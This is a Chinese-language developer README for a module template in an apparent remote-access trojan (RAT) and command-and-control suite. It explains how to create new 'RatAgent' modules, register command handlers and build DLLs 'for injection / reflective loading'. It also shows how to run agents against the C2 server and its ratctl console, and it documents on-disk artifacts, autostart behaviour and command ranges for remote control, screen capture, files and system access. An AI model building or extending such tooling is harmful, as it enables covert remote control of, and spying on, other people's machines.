# 模块工程模板（`client/agents/_template`）

复制本目录即可产出一个**新的模块 agent**。模块是独立进程、直连 C2；
它只与 `client/core` 交互，**不需要插件 ABI/加载器**。

## 怎么开一个新模块

1. 复制目录：`cp -r client/agents/_template client/agents/<module>`
2. 改两个工程里的三处（两个文件都要改）：
   - `RatAgentModuleId` → 你的模块名（如 `screen`）
   - `RatAgentModuleCaps` → 你的能力位（见 `core/module_id.h`）
   - `TargetName` → `RatAgent.<module>`，`ProjectGuid` → 换一个新的唯一 GUID
3. 在 `caps.cpp` 里登记你的指令：往 `kCommands[]` 加 `{ 指令码, 处理函数 }`
4. 把新模块自己的 `*.cpp` 加进两个 `.vcxproj` 的源文件清单
5. **不要动 `client/core`** —— 如果你发现"必须改 core 才能加这个能力"，说明边界没切干净，
   应当先修边界（见 `core/capability.h` 的说明）。这条是模块化是否成立的判据。

## 工程里的文件分组（VS 里看到的两个文件夹）

每个工程的文件按**来源**分成两个过滤器，VS 里就是两个文件夹（不再是平铺一堆，一眼能看出
哪些是共享的、哪些是本模块的）：

| 分组 | 含义 | 例 |
|---|---|---|
| `core (shared)` | **共享内核**：同一个 `client/core` 被**每个模块**编译进去。改它 = 改所有模块，所以必须保持能力无关（见 `core/capability.h`） | `core\agent_runtime.cpp`、`core\capability.cpp` |
| `module (<你的模块名>)` | **只有本模块有的文件**：你新增的能力都放这里 | `caps.cpp`、`screen_spy.cpp` |

（分组定义在 `<工程名>.vcxproj.filters`，见下。）

复制模板开新模块时：改两个工程里的 `RatAgentModuleId`，并把 `<工程名>.vcxproj.filters` 里
`module (template)` 这个名字一并改掉。两个文件分工不同：

| 文件 | 作用 | 谁读 |
|---|---|---|
| `<工程名>.vcxproj` | **编译什么**（源文件清单、宏、链接库） | MSBuild / VS 构建 |
| `<工程名>.vcxproj.filters` | **VS 里怎么分组显示**（文件夹） | 只有 VS 的界面 |

新加的 `.cpp`/`.h` 要做**两件事**（只做第一件，VS 里它会跑到项目根目录，看不出属于谁）：

1. 写进 `.vcxproj` 的 `ClCompile`/`ClInclude`（否则**不参与编译**）；
2. 在 `<工程名>.vcxproj.filters` 里挂上分组 `module (<module>)`。

> ⚠ **VS 的 C++ 过滤器只读 `.vcxproj.filters`**：把 `<Filter>` 写进 `.vcxproj` 是无效的
> （工程照样能编，但界面里依然平铺）。

**自检**：`python scripts/check_projects.py` 会检查"引用的文件是否都存在 / 每个文件是否都在
`.filters` 里挂了分组 / `.filters` 与 `.vcxproj` 是否同步（有无漏项或幽灵项）"。改名或搬文件后跑一下，
比在 VS 里肉眼找快得多。

## 构建

```powershell
$msb = 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe'
$base = 'D:/code/projects/c2-suite/build/agents/<module>'

# DLL 形态（注入 / 反射加载用）
& $msb client\agents\<module>\RatAgent.<module>.vcxproj `
    -p:Configuration=Release -p:Platform=x64 `
    -p:IntDir=$base/dll-obj/ -p:OutDir=$base/dll/

# EXE 形态（独立部署 / 调试用）
& $msb client\agents\<module>\RatAgent.<module>.exe.vcxproj `
    -p:Configuration=Release -p:Platform=x64 `
    -p:IntDir=$base/exe-obj/ -p:OutDir=$base/exe/
```

## 验证

```powershell
# 跑 C2 与模块（EXE 形态最简单）
.\build\bin\c2server.exe
.\build\agents\<module>\exe\RatAgent.<module>.exe 127.0.0.1 4444 -tcp

# 另开一个终端：应能看到模块标签（os 列）与能力位
.\build\bin\ratctl.exe
ratctl> sessions
ratctl> use <id>
ratctl> raw 2001 deadbeef      # 发任意业务指令（测你自己的指令码）
ratctl> sysinfo                # core 内置指令应照常可用
```

参考脚本：[`scripts/e2e_template.py`](../../../scripts/e2e_template.py)（把 `AGENT` 换成你的产物即可）。

## 约定（详见 `core/module_id.h`）

| 项 | 规则 |
|---|---|
| 落盘物 | `%LOCALAPPDATA%\RatAgent\<module>.id` / `<module>.log` / `<module>.autostart.args`；EXE 形态为 CWD 下的 `<module>.id` |
| C2 侧标签 | 握手 `os_info` = `Windows (<module>)`（仅 TCP 长连接可见；beacon 侧是已知缺口） |
| 能力位 | 走 `plugins` 位图（`sessions` / `session <id>` 可见） |
| 指令码 | 在**你自己的段**里挑：0x1xxx 远程控制 / 0x2xxx 文件 / 0x3xxx 系统；别占 core 内置的 0x3001/0x3008/0x3009 |
| 自启动/停止 | `autostart.args` **存在且内容非空** → 用文件参数；**不存在或内容为空** → 用内置默认配置（加载即自启） |
